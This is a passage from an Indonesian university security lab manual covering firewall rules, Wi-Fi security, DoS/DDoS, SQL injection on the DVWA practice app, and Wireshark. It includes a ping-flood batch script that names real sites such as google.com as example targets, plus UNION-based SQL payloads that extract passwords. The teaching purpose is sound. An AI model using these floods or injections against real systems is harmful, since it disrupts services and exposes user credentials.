menyediakan laporan audit yang lebih rinci dan cenderung lebih memaksakan model keamanan yang lebih konservatif daripada network level firewall. Firewall ini bisa dikatakan sebagai jembatan. Application-Proxy Firewall biasanya berupa program khusus, misal squid Firewall IPTabels packet filtering memiliki tiga aturan (policy), yaitu : • INPUT Mengatur paket data yang memasuki firewall dari arah intranet maupun internet. kita bisa mengelola komputer mana saja yang bisa mengakses firewall. misal: hanya komputer IP 192.168.1.100 yang bisa SSH ke firewall dan yang lain tidak boleh. • OUTPUT Mengatur paket data yang keluar dari firewall kea rah internet. Biasanya output tidak diset, karena busa membatasi kemampuan firewall itu sendiri. • FORWARD Mengatur paket data yang melintasi firewall dari arah internet ke intranet maupun sebaliknya. Policy forward paling banyak dipakai saat ini untuk mengatur koneksi internet berdasarkan port, mac address dan alamat IP. Selain aturan (policy) firewall iptables juga mempunyai parameter yang disebut dengan TARGET, yaitu status yang menentukan koneksi di iptables diizinkan lewat atau tidak. Target ada tiga macam, yaitu :

• ACCEPT Akses diterima dan diizinkan melewati firewall • REJECT

---

<!-- Halaman 64 -->

Akses ditolak, koneksi dari computer klien yang melewati firewall langsung terputus, biasanya terdapat pesan “Connection Refused”. Target Reject tidak menghabiskan bandwidth internet karena akses langsung ditolak, hal ini berbeda dengan DROP. • DROP Akses diterima tetapi paket data langsung dibuang oleh kernel, sehingga pengguna tidak mengetahui kalau koneksinya dibatasi oleh firewall. Pengguna melihay seakan-akan server yang dihubungi mengalami permasalahan teknis. Pada koneksi internet yang sibuk dengan trafik tinggi Target Drop sebaiknya jangan digunakan. 7.4. HARDWARE DAN SOFTWARE Hardware dan software yang digunakan dalam praktikum ini yaitu: 1. Komputer. 2. Command Prompt 3. Notepad 7.5. PRE-TEST Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 03KU1 | CPMK 5.1.3 | Jelaskan apa itu firewall! | 30 |
| 2. |  |  | Sebutkan dan jelaskan fungsi dari firewall. | 40 |
| 3. |  |  | Jelaskan 2 macam firewall | 30 |

### Aturan Penilaian (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Dokumen Pendukung | Skor |
| --- | --- | --- | --- | --- | --- |
| 1. | CPL 03KU1 | CPMK 5.1.3 | Selesaikan langkah praktikum 1 – 11 | Hasil praktikum langkah 1 – 11 | 100 |

### Langkah-Langkah Praktikum:

### a. Mengatur firewall pada OS linux dengan iptables:

### 1. Install iptables

### Sudo apt-get install iptables

### 2. Melihat chain iptables : input, forward dan output

### iptables –L –v

### 3. Melihat policy iptables

### sudo iptables –L | grep policy

### 4. Mengatur rules iptables

---

<!-- Halaman 65 -->

• Koneksi dari satu IP Address iptables –A INPUT –s 192.168.70.1 –j DROP

• Koneksi dari range IP Address iptables –A INPUT –s 192.168.70.1/24 –j DROP atau iptables –A INPUT –s 192.168.70.1/255.255.255.0 –j DROP

• Koneksi dari port tertentu iptables –A INPUT –p tcp –dport ssh –s 192.168.70.1 –j DROP -> dari satu IP Address iptables –A INPUT –p tcp –dport ssh –j DROP -> dari semua IP Address

• Menyimpan rules iptables Ubuntu: sudo /sbin/iptables-save Red Hat/CentOS /sbin/service iptables save atau /etc/init.d/iptables save

### b. Mengatur firewall pada OS windows dengan Windows Firewall with Advanced Security

### 1. Buka Windows Firewall with Advanced Security

Klik Start->Windows Administrative Tools->Windows Firewall with Advanced Security Atau pada command prompt

### 2. Klik Inbound Rules → Klik New Rules

Gambar 7. 1 Proses inbound rule firewall 1

---

<!-- Halaman 66 -->

### 3. Pilih Custom → klik next

Gambar 7. 2 Proses inbound rule firewall 2

### 4. Pilih All Program → Klik next

Gambar 7. 3 Proses inbound rule firewall 3

---

<!-- Halaman 67 -->

### 5. Protocol and Ports, klik next

Gambar 7. 4 Proses Inbound rule firewall 4

### 6. UI Scope, pada Local IP pilih these IP Address → klik add

Gambar 7. 5 Proses Inbound Rule Firewall 5

---

<!-- Halaman 68 -->

### 7. Masukkan IP Address → klik OK

Gambar 7. 6 Proses inbound rule firewall 6

### 8. UI Scope, klik Next

Gambar 7. 7 Proses inbound rule firewall 7

---

<!-- Halaman 69 -->

### 9. Pada user Interface Action, ada 3 pilihan,

Gambar 7. 8 Proses inbound rule firewall 8

### 10. Pada user interface Profile, ada 3 checkbox berisikan Domain, Private dan Public,

Gambar 7. 9 Proses inbound rule firewall 9

---

<!-- Halaman 70 -->

### 11. Masukkan nama rules dan deskripsi rules, bila sudah diisikan maka klik finish.

### Gambar 7. 10 Proses inbound rule firewall 10

### 7.7. POST TEST

### Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 03KU1 | CPMK 5.1.3 | 1. Lakukan pengeblokan untuk aplikasi Facebook, Instagram. 2. Screenshot hasil implementasi firewall point 1. | 50 50 |

### 7.8. HASIL CAPAIAN PRAKTIKUM

Diisi oleh asisten setelah semua assessment dinilai.

| No | Bentuk Assessment | CPL | CPMK | Bobot | Skor (0-100) | Nilai Akhir (Bobot x Skor) |
| --- | --- | --- | --- | --- | --- | --- |
| 1. | Pre-Test | CPL 03-KU1 | CPMK 5.1.3 | 20% | 1oo | 20 |
| 2. | Praktik | CPL 03-KU1 | CPMK 5.1.3 | 30% | 100 | 30 |

---

<!-- Halaman 71 -->

| Kolom 1 | Kolom 2 | Kolom 3 | Kolom 4 | Kolom 5 | Kolom 6 | Kolom 7 |
| --- | --- | --- | --- | --- | --- | --- |
|  |  |  |  |  |  |  |
| 3. | Post-Test | CPL 03-KU1 | CPMK 5.1.3 | 50% | 100 | 50 |
| Total Nilai |  |  |  |  |  | 100 |

### LEMBAR JAWABAN PRE-TEST DAN POST-TEST PRAKTIKUM

| Nama : NIM : | Asisten: Paraf Asisten: | Tanggal: Nilai: |
| --- | --- | --- |

---

<!-- Halaman 73 -->

## PRAKTIKUM 8:      WIRELESS NETWORK SECURITY

Pertemuan ke : 8 Total Alokasi Waktu : 90 menit ● Materi : 15 menit ● Pre-Test : 15 menit ● Praktikum : 45 menit ● Post-Test : 15 menit Total Bobot Penilaian : 100% ● Pre-Test : 20 % ● Praktik : 30 % ● Post-Test : 50 % Pemenuhan CPL dan CPMK:

| CPL 03-KU1 | Mampu menerapkan pemikiran logis, kritis, sistematis, dan inovatif dalam konteks pengembangan atau implementasi ilmu pengetahuan dan teknologi yang memperhatikan dan menerapkan nilai humaniora yang sesuai dengan bidang rekayasa perangkat lunak serta data dan sistem cerdas maupun bidang lainnya. |
| --- | --- |
| CPMK 5.1.3 | Mendemokan cara mengamankan internet, jaringan wireless, dan basis data |

8.1. DESKRIPSI CAPAIAN PEMBELAJARAN Setelah mengikuti praktikum ini mahasiswa diharapkan mampu: 1. Memahami konsep wireless network security, snapping paket data. 2. Mampu menerapkan konsep wireless network security, snapping paket data. 8.2. INDIKATOR KETERCAPAIAN PEMBELAJARAN Indikator ketercapaian diukur dengan:

| CPL 03-KU1 | CPMK 5.1.3 | Mendemokan cara mengamankan internet, jaringan wireless, dan basis data |
| --- | --- | --- |

Jaringan Tanpa Kabel (Wireless) Sistem jaringan Wireless atau WIFI tidak memerlukan media jaringan berupa kabel jaringan, tetapi memerlukan ruangan atau space dimana jarak jangkauan jaringan ditentukan oleh kekuatan pancaran signal radio dari masing-masing device wireless yang digunakan. System Wireless mempunyai beberapa keuntungan antara lain pemakai tidak dibatasi oleh ruang gerak dan hanya dibatasi pada jarak jangkauan dari satu titik pemacar WIFI. Untuk jarak pada sistem WIFI mampu menjangkau area sekitar 100 feet atau 30M radius.

Selain itu dapat diperkuat dengan perangkat khusus seperti booster yang berfungsi sebagai relay yang mampu menjangkau ratusan bahkan beberapa kilometer ke satu arah (directional). Bahkan

---

<!-- Halaman 74 -->

hardware terbaru, terdapat perangkat dimana satu perangkat Access Point dapat saling merelay (disebut bridge) kembali ke beberapa bagian atau titik sehingga memperjauh jarak jangkauan dan dapat disebar dibeberapa titik dalam suatu ruangan untuk menyatukan sebuah network LAN.

Beberapa keuntungan yang dimiliki oleh Wireless LAN :

- Mobility - Lebih cepat dalam instalasi - Simple - Installation flexibility - Reduced cost of ownership Keamanan Wireless :

- Hidden SSID - Disable default authenticate - Mac address list - WEP - Didepan server VPN - Menggunakan hotspot

Security Profile z WEP = Wired Equivalent Privacy

- Enkripsi data hanya pada 802.11 menggunakan static key - Sangat simple -40 bit = menggunakan enkripsi 40 bit (juga dikenal sebagai 64bit-WEP) - 104 bit = menggunakan enkripsi 104bit (juga dikenal sebagai 128bit-WEP) - Static key = text (dalam hexa key) WPA = Wi-Fi Protection Access

- Kombinasi dari 802.1x, EAP, MIC, TKIP dan AES

Security Profiles Dalam Winbox

---

<!-- Halaman 75 -->

Gambar 8. 1 Security Profiles Winbox

Aplikasi WEP Security

Gambar 8. 2 WEP Security 1

---

<!-- Halaman 76 -->

Gambar 8. 3 WEP Security 2

Aplikasi WPA Security

Gambar 8. 4 WPA Security 1

Note : pada kedua router (AP dan Station set WPA harus sama persis) Penggunaan WPA Security

Gambar 8. 5 WAP Security 2

---

<!-- Halaman 77 -->

8.4. HARDWARE DAN SOFTWARE Hardware dan software yang digunakan dalam praktikum ini yaitu: 1. Komputer. 2. Notepad 8.5. PRE-TEST Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 03KU1 | CPMK 5.1.3 | Jelaskan menurut anda apa yang dimaksud dengan jaringan wireless! | 30 |
| 2. | CPL 03KU1 | CPMK 5.1.3 | Sebutkan dan jelaskan jenis jaringan wireless. | 30 |
| 3. | CPL 03KU1 | CPMK 5.1.3 | Sebutkan kelemahan dan keuntungan dari jaringan wireless | 40 |

### 8.6. LANGKAH PRAKTIKUM

### Aturan Penilaian (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Dokumen Pendukung | Skor |
| --- | --- | --- | --- | --- | --- |
| 1. | CPL 03KU1 | CPMK 5.1.3 | Selesaikan langkah praktikum 1 – 5 | Hasil praktikum langkah 1 – 5 | 100 |

### Langkah-Langkah Praktikum:

1. Nyalakan komputer.

2. Buka aplikasi winbox.

3. Pastikan winbox sudah terkoneksi dengan routernya.

4. Lakukan proses seperti pada gambar di atas.

5. Wi-Fi sudah siap digunakan.

### 8.7. POST TEST

### Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 03KU1 | CPMK 5.1.3 | Jelaskan menurut anda apa yang akan terjadi jika di suatu wlan memiliki celah keamanan! | 50 |
| 2. | CPL 03KU1 | CPMK 5.1.3 | Ada berapa banyak client yang dapat terhubung kedalam sistem infrastruktur wlan | 50 |

---

<!-- Halaman 78 -->

### 8.8. HASIL CAPAIAN PRAKTIKUM

Diisi oleh asisten setelah semua assessment dinilai.

| No | Bentuk Assessment | CPL | CPMK | Bobot | Skor (0-100) | Nilai Akhir (Bobot x Skor) |
| --- | --- | --- | --- | --- | --- | --- |
| 1. | Pre-Test | CPL 03-KU1 | CPMK 5.1.3 | 20% | 100 | 20 |
| 2. | Praktik | CPL 03-KU1 | CPMK 5.1.3 | 30% | 100 | 30 |
| 3. | Post-Test | CPL 03-KU1 | CPMK 5.1.3 | 50% | 100 | 50 |
| Total Nilai |  |  |  |  |  | 100 |

---

<!-- Halaman 79 -->

### LEMBAR JAWABAN PRE-TEST DAN POST-TEST PRAKTIKUM

| Nama : NIM : | Asisten: Paraf Asisten: | Tanggal: Nilai: |
| --- | --- | --- |

---

<!-- Halaman 81 -->

## PRAKTIKUM 9:      DoS dan DDoS

Pertemuan ke : 9 Total Alokasi Waktu : 90 menit ● Materi : 15 menit ● Pre-Test : 15 menit ● Praktikum : 45 menit ● Post-Test : 15 menit Total Bobot Penilaian : 100% ● Pre-Test : 20 % ● Praktik : 30 % ● Post-Test : 50 % Pemenuhan CPL dan CPMK:

| CPL 06-P01 | Mampu menerapkan pemikiran logis, kritis, sistematis, dan inovatif dalam konteks pengembangan atau implementasi ilmu pengetahuan dan teknologi yang memperhatikan dan menerapkan nilai humaniora yang sesuai dengan bidang rekayasa perangkat lunak serta data dan sistem cerdas maupun bidang lainnya. |
| --- | --- |
| CPMK 5.1.4 | Mendemokan cara mengamankan internet, jaringan wireless, dan basis data |

9.1. DESKRIPSI CAPAIAN PEMBELAJARAN Setelah mengikuti praktikum ini mahasiswa diharapkan mampu: 1. Memahami konsep serangan DOS dan DDOS dan cara mengatasinya. 9.2. INDIKATOR KETERCAPAIAN PEMBELAJARAN Indikator ketercapaian diukur dengan:

| CPL 06-P01 | CPMK 5.1.4 | Mendemokan cara mengamankan internet, jaringan wireless, dan basis data |
| --- | --- | --- |

Serangan DoS (denial of service attacks) adalah jenis serangan terhadap sebuah computer atay server di dalam jaringan internet dengan cara menghabiskan sumber (resource) yang dimiliki oleh computer tersebut sampai computer tersebut tidak dapat menjalankan fungsinya dengan benar sehingga secara tidak langsung mencegah pengguna lain untuk menperoleh akses layanan dari computer yang diserang tersebut.

Dalam sebuah serangan Denial of Service, si penyerang akan mencoba untuk mencegah akses seorang pengguna terhadap system atau jaringan dengan mengunakan beberapa cara, yakni sebagai berikut:

---

<!-- Halaman 82 -->

- Membanjiri lalu lintas jaringan dengan banyak data sehingga lalu lintas jaringan yang datang dari pengguna yang terdaftar menjadi tidak dapat masuk ke dalam sistem jaringan. Teknik ini disebut traffic flooding. - Membanjiri jaringan dengan banyak request terhadap sebuah layanan jaringan yang disediakan oleh sebuah host sehingga request yang datang dari pengguna terdaftar tidak dapat dilayani oleh layanan tersebut. Teknik ini disebut sebagai request flooding. - Mengganggu komunikasi antara sebuah host dan kliennya yang terdaftar dengan menggunakan banyak cara, termasuk dengan mengubah informasi konfigurasi sistem atau bahkan perusakan fisik terhadap komponen dan server.

Bentuk serangan Denial of Service awal adalah serangan SYN flooding Attack, yang pertaman kali muncul pada tahun 1996 dan mengeksploitasi terhadap kelemahan yang terdapat di dalam protocol Transmission Control Protocol (TCP). Serangan – serangan lainnya akhirnya dikembangkan untuk mengeksploitasi kelemahan yang terdapat di dalam system operasi, layanan jaringan atau aplikasi untuk menjadikan system, layanan jaringan, atau aplikasi tersebut tidak dapat melayani pengguna, atau bahkan mengalami crash. Beberapa tool yang digunakan untuk melakukan serangan DoS pun banyak dikembangkan setelah itu (bahkan beberapa tool dapat diperoleh secara bebas), termasuk di antaranya Bonk, LAND, Smurf, Snork, WinNuke, dan Teardrop.

Meskipun demikian, serangan terhadap TCP merupakan serangan DoS yang sering dilakukan. Hal ini disebabkan karena jenis serangan lainnya (seperti halnya memenuhi ruangan hard disk dalam system, mengunci salah seorang akun pengguna yang valid, atau memodifikasi table routing dalam sebuah router) membutuhkan penetrasi jaringan terlebih dahulu, yang kemungkinan penetrasinya kecil, apalagi system jaringan tersebut telah diperkuat.

### a. DoS attack : Denial of Service attack

Serangan ini melibatkan satu computer/koneksi internet untuk (membanjiri) sebuah server dengan paket ICMP/TCP/UDP, tujuan dari serangan ini adalah untuk membuat bandwith server menjadi overload, sehingga server tidak bisa lagi menangani trafik yang masuk dan server akhirnya down. b. DDoS attack : Distributed Denial of Service attack

DDoS attack hampir sama dengan DoS tetapi perbedaan dari hasil yang disebabkan olehnya sangat berbeda. Serangan DDos dijalankan menggunakan metode computer yang terdistribusi yang sering disebut dengan ‘botnet army’, atau biasa juga dikenal dnegan computer “zombie”. Prosesnya dengan cara menginfeksi computer lain dengan malware yang memberikan akses bagi botnet owner kepada computer yang terinfeksi. Hal ini bisa berarti, botnet owner bisa menggunakan resource apa saja dari computer korban dan menggunakan koneksi computer tersebut untuk membanjiri (flood) target yang akan diserang. Server yang diserang akan lumpuh sangat cepat karena beberapa koneksi digunakan untuk melawan satu koneksi. Ini seperti perkelahian, bila 1 lawan 1 maka kemungkinan menang 50:50, tetapi jika 1000 lawan 1, maka akan kalah.

Ada 5 tipe dasar DoS attack :

- Penggunaan berlebihan sumber daya computer, seperti bandwidth, disk space, atau processor. - Gangguan terhadap informasi konfigurasi, seperti informasi routing. - Gangguan terhadap informasi status, misalnya memaksa me-reset TCP session. - Gangguan terhadap komponen – komponen fisik network.

---

<!-- Halaman 83 -->

- Menghalang-halangi media komunikasi antara computer dengan user sehingga mengganggu komunikasi. Gejala-gejala DDoS attack:

- Kinerja jaringan menurun, tidak seperti biasanya, membuka file atau mengakses situs menjadi lebih lambat. - Fitur-fitur tertentu pada sebuah website hilang. - Website sama sekali tidak bisa diakses. - Peningkatan jumlah email spam yang diterima sangat dramatis. Tipe DoS yang ini sering diistilahkan dengan “Mail Bomb” 9.4. HARDWARE DAN SOFTWARE Hardware dan software yang digunakan dalam praktikum ini yaitu: 1. Komputer. 2. Commad Prompt 3. Notepad 9.5. PRE-TEST Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 03KU1 | CPMK 5.1.3 | Jelaskan Perbedaan Dos dan DDoS | 30 |
| 2. |  |  | Bagaimana Proses Serangan Dos dan DDoS | 40 |
| 3. |  |  | Berikan contoh serangan Dos / DDoS | 30 |

### Aturan Penilaian (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Dokumen Pendukung | Skor |
| --- | --- | --- | --- | --- | --- |
| 1. | CPL 03KU1 | CPMK 5.1.3 | Selesaikan langkah praktikum | Hasil praktikum langkah | 100 |

### Langkah-Langkah Praktikum:

Banyak software untuk men-generate serangan DoS, untuk praktikum sekarang, men-generate serangan DoS melalui cmd windows.

Cara yang pertama: • Buka CMD, windws+R, ketik cmd lalu ok • Ketik “ping<ip add> -l 50000 -n 5000 -w 0.00001” Keterangan: # <ip add> : IP address situs uang akan di DDoS (bisa digantikan dengan alamat situs) # -l 50000 : besar ping yang dikirim server sebesar 50000 bytes (bisa diganti, maksimal 65500bytes) # -n 5000 : ukuran buffer yang dikirim 5000 bytes (bisa diganti)

---

<!-- Halaman 84 -->

# -w 0.00001: waktu tunggu tiap ping 0.00001 milidetik (bisa diganti) • Tekan enter dan tunggu hingga anda mendapatkan pesan “Request timed out”

### Cara yang kedua :

• Buka notepad (accessories → notepad) • Tulis script berikut :

@echo off mode 67,16 title DDOS Attacking Server color 0c cls echo ==================================== echo =          Hacking Tools           = echo ==================================== echo. echo ++++++++++++++++++++++++++++++++++++ echo + Name : DDOS Attacking Server     + echo + Author : Tegar Ft. Reza          + echo + Company : Lab. Komdas Kampus 3   + echo ++++++++++++++++++++++++++++++++++++ echo. goto Next echo. echo DDOS With Batchfile echo. set /p x=Server-Target: echo. ping %x% @ping.exe 127.0.0.1 -n 5 -w 1000 > nul goto Next :Next echo. echo ************************************ echo *     Masukan IP / Host Target     * echo ************************************ echo. set /p m=ip Host: echo. set /p n=Packet Size: echo. :DDOS color 0b

---

<!-- Halaman 85 -->

echo Attacking Server %m% ping %m% -i %n% -t >nul goto DDOS • Simpan file tersebut dengan menggunakan ekstensi .bat (missal: DDoS.bat), usahakan menyimpan file di folder yang dapat ditemukan • Close file yang sudah dibuat, buka Kembali file yang sudah berekstensi .bat. • Isi IP Host menggunakan IP server atau bisa menggunakan alamat server tanpa http:// (missal : google.com) • Lalu akan muncul packet size, bisa disikan sesuai keinginan, missal 1000000000 • Tekan enter, maka proses DDoS akan berjalan, DDoS membutuhkan waktu yang lumayan lama tergantung kemampuan situs yang kita serang. Akan lebih baik bila melakukan serangan DDoS secara serentak atau dengan banyak computer.

### WARNING!!!

Praktikum DoS dan DDoS hanya untuk pengetahuan saja, jangan dicoba ke website orang lain atau website resmi. Jika ingin mencoba serangan DDoS, maka cobalah pada system yang dibuat sendiri agar tidak menimbulkan kerugian untuk orang lain.

### 9.7. POST TEST

### Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 03KU1 | CPMK 5.1.3 | Tuliskan Langkah - langkah dalam men-generate serangan DoS/DDoS disertai dengan Screen Capture dan jelaskan setiap langkah langkahnya! | 80 |
| 2. | CPL 03KU1 | CPMK 5.1.3 | Analisis dan simpulkan apakah munculnya gambar kucing pada portal UAD pada saat KRSan termasuk serangan DDoS? Jelaskan jawaban anda! | 20 |

### 9.8. HASIL CAPAIAN PRAKTIKUM

Diisi oleh asisten setelah semua assessment dinilai.

| No | Bentuk Assessment | CPL | CPMK | Bobot | Skor (0-100) | Nilai Akhir (Bobot x Skor) |
| --- | --- | --- | --- | --- | --- | --- |
| 1. | Pre-Test | CPL 03-KU1 | CPMK 5.1.3 | 20% | 100 | 20 |
| 2. | Praktik | CPL 03-KU1 | CPMK 5.1.3 | 30% | 100 | 30 |
| 3. | Post-Test | CPL 03-KU1 | CPMK 5.1.3 | 50% | 100 | 50 |
| Total Nilai |  |  |  |  |  | 100 |

---

<!-- Halaman 87 -->

### LEMBAR JAWABAN PRE-TEST DAN POST-TEST PRAKTIKUM

| Nama : NIM : | Asisten: Paraf Asisten: | Tanggal: Nilai: |
| --- | --- | --- |

---

<!-- Halaman 89 -->

## PRAKTIKUM 10:     SQL INJECTION

Pertemuan ke : 10 Total Alokasi Waktu : 90 menit ● Materi : 15 menit ● Pre-Test : 15 menit ● Praktikum : 45 menit ● Post-Test : 15 menit Total Bobot Penilaian : 100% ● Pre-Test : 20 % ● Praktik : 30 % ● Post-Test : 50 % Pemenuhan CPL dan CPMK:

| CPL 06-P01 | Mampu menerapkan pemikiran logis, kritis, sistematis, dan inovatif dalam konteks pengembangan atau implementasi ilmu pengetahuan dan teknologi yang memperhatikan dan menerapkan nilai humaniora yang sesuai dengan bidang rekayasa perangkat lunak serta data dan sistem cerdas maupun bidang lainnya. |
| --- | --- |
| CPMK 5.1.4 | Mendemokan cara mengamankan internet, jaringan wireless, dan basis data |

10.1. DESKRIPSI CAPAIAN PEMBELAJARAN Setelah mengikuti praktikum ini mahasiswa diharapkan mampu: 1. Memahami dan menerapkan kebutuhan keamanan pada sistem basis data. 10.2. INDIKATOR KETERCAPAIAN PEMBELAJARAN Indikator ketercapaian diukur dengan:

| CPL 03-KU1 | CPMK 5.1.3 | Mendemokan cara mengamankan internet, jaringan wireless, dan basis data |
| --- | --- | --- |

SQL adalah Structured Query Language, merupakan bahasa standar dari RMDS (Relational Database Management System) yang digunakan untuk mengolah data dalam berbagai keperluan. Injections adalah injeksi atau menginjek atau menyisipkan sesuatu kedalam sesuatu. SQL Injection adalah salah satu Teknik yang sering digunakan untuk menyerang sebuah situs web, dimana seorang penyerang bisa mendapatkan akses ke basis data di dalam system (system utama). Dengan car aini memungkinkan seseorang dapat login tanpa harus memiliki akun di sebuah website. Selain itu SQL Injection juga memungkinkan seseorang mengubah, menghapus, maupun menambahkan data-data yang berada di dalam database bahkan pula dapat mematikannya.

---

<!-- Halaman 90 -->

Gambar 10. 1 Ilustrasi SQL Injection

### a. Metode-metode dalam SQL Injection

• Union Based SQL Injection Union based SQL Injection adalah metode SQL Injection perintah UNION untuk menggabungkan hasil dari dua atau lebih perintah SELECT menjadi sebuah hasil tunggal. • String Based SQL Injection String based SQL Injection adalah metode SQL injection yang berbasis menggunakan perintah string • Error Based SQL Injection Error based SQL injection dalam aksinya akan memberikan sebuah perintah ke database sehingga menampilkan pesan error. Dari pesan error tersebut dapat diperoleh informasi yang bisa dimanfaatkan • Double Query SQL Injection Double Query SQL injection adalah metode SQL injection yang berbasis perintah-perintah query • Blind SQL Injection Blind SQL Injection, jenis ini tidak menampilkan pesan error dan tidak menampilkan data atau informasi yang ada, terkadang sedikit sulit untuk melakukan eksploitasi untuk jenis blind SQL injection. Hal ini karena prosesnya dengan memberikan pertanyaan pada database berupa kondisi TRUE/FALSE dan apakah dari halaman yang ditampilkan benar atau tidak. • MsSQL Injection b. Tujuan SQL Injection

• Menambah dan memodifikasi data Tujuan dari serangan ini adalah untuk menambah atau mengubah informasi dalam database. • Menggali data pada sebuah web Jenis-jenis serangan menggunakan Teknik yang akan mengekstrak nilai data dari database. Tergantung pada jenis dari aplikasi Web, informasi ini bisa menjadi sensitive

---

<!-- Halaman 91 -->

|  | jenis serangan adalah untuk memungkinkan penyerang untuk memotong |
| --- | --- |
| otentikasi database dan aplikasi mekanisme. Melewati mekanisme seperti itu bisa |  |
| memungkinkan penyerang untuk menganggap hak dan hak istimewa yang berkaitan |  |
| dengan yang lain pengguna aplikasi. |  |

| Jenis | serangan berusaha untuk mengeksekusi perintah sewenang-wenang pada |  |
| --- | --- | --- |
| database. Perintah-perintah ini dapat disimpan prosedur atau fungsi yang tersedia bagi |  |  |
| pengguna database. |  |  |

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 03KU1 | CPMK 5.1.3 | Jelaskan yang dimaksud SQL Injection | 30 |
| 2. |  |  | Analisis dan Paparkan kosep dari SQL Injection | 40 |
| 3. |  |  | Jelaskan Target Serangan pada SQL Injection | 30 |

### 10.6. LANGKAH PRAKTIKUM

### Aturan Penilaian (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Dokumen Pendukung | Skor |
| --- | --- | --- | --- | --- | --- |
| 1. | CPL 03KU1 | CPMK 5.1.3 | Selesaikan langkah praktikum 1 – 7 | Hasil praktikum langkah 1 – 7 | 100 |

### Langkah-Langkah Praktikum:

1. Aktifkan XMPP database dan localhost 2. Kita akan menggunakan salah satu platform DVWA (link) 3. Dowload dengan format ZIP dan simpan pada folder matkul KK dengan nama folder:pertemuan

10

---

<!-- Halaman 92 -->

4. Unzip DVWA yang sudah di download 5. Buka localhost contoh (http://localhost/PraktikumKK2026/Pertemuan10/DVWA-master/).

### Website akan memberikan error warning seperti ini.

### 6. Buka folder DVWA kemudian cari seperti gambar di bawah. Kemudian ubah format

### config.inc.php.dist menjadi config.inc.php

### 7. Buka konfigurasi config.inc.php seperti yang ada digambar

### 8. Kemudian buat databse dengan nama “dvwa”

### 9. Kemudian kelink berikut

---

<!-- Halaman 93 -->

### 10. Lalu hubungkan databse dengan scrol kebawah

### 11. Setelah itu akses login.php

12. Kemudian login dengan usernam = “admin” dan password=”password” 13. Lihat pada bagian sidebar kemudian pilih DVWA security. Kemudian pilih low

---

<!-- Halaman 94 -->

### 14. Pada percobaan ini kita akan melakukan sql injection ini

### 15. Berikur syntax-sql yang digunakan untuk memanipulasi atau mengetahui nilai dari database

• SELECT first_name, last_name FROM users WHERE user_id = '1'; • SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1'; • SELECT first_name, last_name FROM users WHERE user_id = '1' union select user,password from users #'; • 1' union select user,password from users #

### 10.7. POST TEST

### Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 03KU1 | CPMK 5.1.3 | Lakukan Sql injection dengan level security medium lalu temukan password dari 5 user! Clue: gunakan inspect | 100 |

---

<!-- Halaman 95 -->

### 10.8. HASIL CAPAIAN PRAKTIKUM

Diisi oleh asisten setelah semua assessment dinilai.

| No | Bentuk Assessment | CPL | CPMK | Bobot | Skor (0-100) | Nilai Akhir (Bobot x Skor) |
| --- | --- | --- | --- | --- | --- | --- |
| 1. | Pre-Test | CPL 03-KU1 | CPMK 5.1.3 | 20% | 100 | 20 |
| 2. | Praktik | CPL 03-KU1 | CPMK 5.1.3 | 30% | 100 | 30 |
| 3. | Post-Test | CPL 03-KU1 | CPMK 5.1.3 | 50% | 100 | 50 |
| Total Nilai |  |  |  |  |  | 100 |

---

<!-- Halaman 96 -->

### LEMBAR JAWABAN PRE-TEST DAN POST-TEST PRAKTIKUM

| Nama : NIM : | Asisten: Paraf Asisten: | Tanggal: Nilai: |
| --- | --- | --- |

---

<!-- Halaman 98 -->

## PRAKTIKUM 11:     ANALISA PAKET DATA

Pertemuan ke : 11 Total Alokasi Waktu : 90 menit ● Materi : 15 menit ● Pre-Test : 15 menit ● Praktikum : 45 menit ● Post-Test : 15 menit Total Bobot Penilaian : 100% ● Pre-Test : 20 % ● Praktik : 30 % ● Post-Test : 50 % Pemenuhan CPL dan CPMK:

| CPL 06-P01 | Menguasai konsep teoritis bidang pengetahuan Ilmu Komputer/Informatika secara umum dan konsep teoritis bagian khusus dalam bidang pengetahuan tersebut secara mendalam, serta mampu memformulasikan penyelesaian masalah prosedural. |
| --- | --- |
| CPMK 5.1.4 | Menganalisis keamanan dan jaringan komputer |

11.1. DESKRIPSI CAPAIAN PEMBELAJARAN Setelah mengikuti praktikum ini mahasiswa diharapkan mampu: 1. Memahami dan mampu menerapkan konsep wireless network security, snapping paket data 11.2. INDIKATOR KETERCAPAIAN PEMBELAJARAN Indikator ketercapaian diukur dengan:

| CPL 06-P01 | CPMK 5.1.4 | Menganalisis keamanan dan jaringan komputer |
| --- | --- | --- |

Wireshark merupakan salah satu network analysis tool atau disebut juga dengan protocol analysis tool atau packet sniffer. Wireshark dapat digunakan untuk troubleshooting jaringan, analisis keamanan, pengembangan software dan protocol, serta untuk keperluan edukasi. Wireshar merupakan software gratis, sebelumnya, wireshar dikenal dengan nama Ethereal. Packet sniffer sendiri diartikan sebagai sebuah program atau tool yang memiliki kemampuan untuk ‘mencegat’ dan melakukan pencatatan terhadap traffic data dalam jaringa. Selama terjadi aliran data dalam, packet sniffer dapat menangkap protocol data unit (PDU), melakukan decoding serta melakukan analisis terhadap isi paket berdasarkan spesifikasi RFC atau spesifikasi-spesifikasi yang lain.

Dalam berbagai kalangan praktisi Wireshark berguna antara lain untuk :

• Network administrator, untuk troubleshooting • Teknisi keamanan jaringan memakainya untuk mengawasi jaringan

---

<!-- Halaman 99 -->

